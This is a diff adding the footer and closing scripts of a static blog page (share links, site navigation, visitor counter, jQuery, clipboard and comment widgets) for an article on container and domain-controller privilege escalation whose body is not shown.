+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&title=容器&amp;域控权限提升"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&is_video=false&description=容器&amp;域控权限提升"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=容器&amp;域控权限提升&body=Check out this article: https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&title=容器&amp;域控权限提升"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&title=容器&amp;域控权限提升"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&title=容器&amp;域控权限提升"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&title=容器&amp;域控权限提升"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&name=容器&amp;域控权限提升&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&t=容器&amp;域控权限提升"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
